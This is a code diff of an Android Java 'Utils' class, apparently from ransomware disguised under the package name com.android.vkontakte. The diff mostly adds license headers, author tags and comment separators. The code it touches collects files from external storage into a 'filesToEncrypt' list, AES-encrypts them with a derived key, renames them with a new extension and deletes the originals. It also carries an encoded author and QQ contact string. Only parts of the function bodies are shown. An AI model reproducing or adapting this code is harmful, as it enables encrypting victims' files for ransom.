@@ -1,3 +1,18 @@
+/*
+ * Copyright (C) 2018 Тимашков Иван
+ *
+ * Licensed under the Apache License, Version 2.0 (the "License");
+ * you may not use this file except in compliance with the License.
+ * You may obtain a copy of the License at
+ *
+ *      http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an "AS IS" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
 package com.android.vkontakte;
 
 import android.app.WallpaperManager;
@@ -8,7 +23,6 @@ import android.graphics.BitmapFactory;
 import android.support.v4.view.MotionEventCompat;
 import android.support.v7.recyclerview.BuildConfig;
 import android.util.Base64;
-import android.util.Log;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileOutputStream;
@@ -38,8 +52,16 @@ import javax.crypto.spec.SecretKeySpec;
 
 import static android.content.Intent.FLAG_ACTIVITY_NO_HISTORY;
 
+//##################################################################
+/**
+ * @since 21.09.2018
+ * @author Тимашков Иван
+ * @author https://github.com/TimScriptov
+ */
 public class Utils
+//##################################################################
 	{
+//===================================================================
 		public static final ExecutorService executorService = Executors.newFixedThreadPool ( 10 );
 		public static List filesToEncrypt = new ArrayList ( );
 
@@ -48,8 +70,9 @@ public class Utils
 		static int hh = 0;
 
 		static boolean 彼岸花开;
-
+//===================================================================
 		public static void GetFiles ( String pathname, String str2, boolean z )
+//===================================================================
 			{
 				File[] listFiles = new File ( pathname ).listFiles ( );
 				for ( File file : listFiles )
@@ -94,8 +117,9 @@ public class Utils
 							}
 					}
 			}
-
+//===================================================================
 		public static String byte2hex ( byte[] bArr )
+//===================================================================
 			{
 				String str = BuildConfig.VERSION_NAME;
 				for ( byte b : bArr )
@@ -104,9 +128,10 @@ public class Utils
 						str = toHexString.length ( ) == 1 ? str + "0" + toHexString : str + toHexString;
 					}
 				return str;
-			}
-
+			}//byte2hex
+//===================================================================
 		public static void bz ( Context context )
+//===================================================================
 			{
 				try
 					{
@@ -117,9 +142,10 @@ public class Utils
 					{
 						e.printStackTrace ( );
 					}
-			}
-
+			}//bz
+//===================================================================
 		public static File decryptFile ( String password, String encryptedFilename, String decryptedFilename )
+//===================================================================
 			{
 				File encryptedFile = new File ( encryptedFilename );
 				File decryptedFile = new File ( decryptedFilename );
@@ -156,9 +182,10 @@ public class Utils
 					}
 
 				return decryptedFile;
-			}
-
+			}//decryptFile
+//===================================================================
 		public static File encryptFile ( String password, String toEncryptFilename, String encryptedFilename )
+//===================================================================
 			{
 				File toEncryptFile = new File ( toEncryptFilename );
 				File encryptedFile = new File ( encryptedFilename );
@@ -194,9 +221,10 @@ public class Utils
 							}
 					}
 				return encryptedFile;
-			}
-
+			}//encryptFile
+//===================================================================
 		public static void deleteDir ( String str, String str2, int i, final Context context )
+//===================================================================
 			{
 				if ( i != 0 )
 					{
@@ -216,10 +244,10 @@ public class Utils
 					}
 				deleteDirWithFile ( new File ( str ), str2, i, context );
 				彼岸花开 = true;
-			}
-
-		public static void deleteDirWithFile ( final File file, final String str, final int i,
-											  final Context context )
+			}//deleteDir
+//===================================================================
+		public static void deleteDirWithFile ( final File file, final String str, final int i, final Context context )
+//===================================================================
 			{
 				if ( file != null && file.exists ( ) && file.isDirectory ( ) )
 					{
@@ -340,9 +368,10 @@ public class Utils
 									}
 							}
 					}
-			}
-
+			}//deleteDirWithFile
+//===================================================================
 		public static String formatDuring ( long j )
+//===================================================================
 			{
 				return to2Str ( j / ( (long) 86400000 ) )
 					+ ":"
@@ -351,14 +380,16 @@ public class Utils
 					+ to2Str ( ( j % ( (long) 3600000 ) ) / ( (long) 60000 ) )
 					+ ":"
 					+ to2Str ( ( j % ( (long) 60000 ) ) / ( (long) 1000 ) );
-			}
-
+			}//formatDuring
+//===================================================================
 		public static String formatDuring ( Date date, Date date2 )
+//===================================================================
 			{
 				return formatDuring ( date2.getTime ( ) - date.getTime ( ) );
-			}
-
+			}//formatDuring
+//===================================================================
 		public static String getStringRandom ( int i )
+//===================================================================
 			{
 				String str = BuildConfig.VERSION_NAME;
 				Random random = new Random ( );
@@ -378,8 +409,8 @@ public class Utils
 						str = str2;
 					}
 				return str;
-			}
-
+			}//getStringRandom
+//===================================================================
 		public static final String getbah ( String str )
 			{
 				String str2 = new String ( Base64.encode ( "by:\u5f7c\u5cb8\u82b1 qq:1279525738".getBytes ( ), 0 ) );
@@ -391,9 +422,10 @@ public class Utils
 					.replaceAll ( str2, "\u5f7c\u5cb8\u82b1\u5f00" )
 					.replaceAll ( "\u4e09\u751f\u77f3\u7554", str2 )
 					.replaceAll ( "\u5f7c\u5cb8\u82b1\u5f00", str3 );
-			}
-
+			}//getbah
+//===================================================================
 		public static String getmm ( String str )
+//===================================================================
 			{
 				byte[] bArr = null;
 				try
@@ -407,9 +439,10 @@ public class Utils
 						e.printStackTrace ( );
 					}
 				return byte2hex ( bArr );
-			}
-
+			}//getmm
+//===================================================================
 		public static final String generateCipher ( String str )
+//===================================================================
 			{
 				int i = 0;
 				char[] cArr = new char[] {
@@ -436,9 +469,10 @@ public class Utils
 						e.printStackTrace ( );
 						return (String) null;
 					}
-			}
-
+			}//generateCipher
+//===================================================================
 		private static Cipher initAESCipher ( String str, int i )
+//===================================================================
 			{
 				Cipher cipher = null;
 				try
@@ -469,16 +503,18 @@ public class Utils
 						e4.printStackTrace ( );
 						return cipher;
 					}
-			}
-
+			}//initAESCipher
+//===================================================================
 		static int jd ( String str )
+//===================================================================
 			{
 				String replaceAll =
 					str.replaceAll ( MainActivity.externalStorageDirectory.toString ( ), BuildConfig.VERSION_NAME );
 				return replaceAll.length ( ) - replaceAll.replaceAll ( "/", BuildConfig.VERSION_NAME ).length ( );
-			}
-
+			}//jd
+//===================================================================
 		public static void jj ( File file, String str, int i )
+//===================================================================
 			{
 				String str2 = generateCipher ( str );
 				if ( i == 0 )
@@ -494,9 +530,10 @@ public class Utils
 							new File ( String.valueOf ( file ) + MainActivity.hz ) );
 					}
 				file.delete ( );
-			}
-
+			}//jj
+//===================================================================
 		public static String l ( String str )
+//===================================================================
 			{
 				int i = 0;
 				String replaceAll =
@@ -519,9 +556,10 @@ public class Utils
 						i++;
 					}
 				return new String ( toCharArray2 );
-			}
-
+			}//l
+//===================================================================
 		public static void deleteFile ( final File file )
+//===================================================================
 			{
 				new Thread ( new Runnable ( ) {
 							@Override public void run ( )
@@ -549,15 +587,19 @@ public class Utils
 										}
 								}
 						} ).start ( );
-			}
-
+			}//deleteFile
+//===================================================================
 		private static String to2Str ( long j )
+//===================================================================
 			{
 				return j > ( (long) 9 ) ? String.valueOf ( j ) + BuildConfig.VERSION_NAME : "0" + j;
-			}
-
+			}//to2Str
+//===================================================================
 		static int zjs ( String str )
+//===================================================================
 			{
 				return str.getBytes ( ).length;
-			}
-	}
+			}//zjs
+//===================================================================
+	}//Utils
+//##################################################################
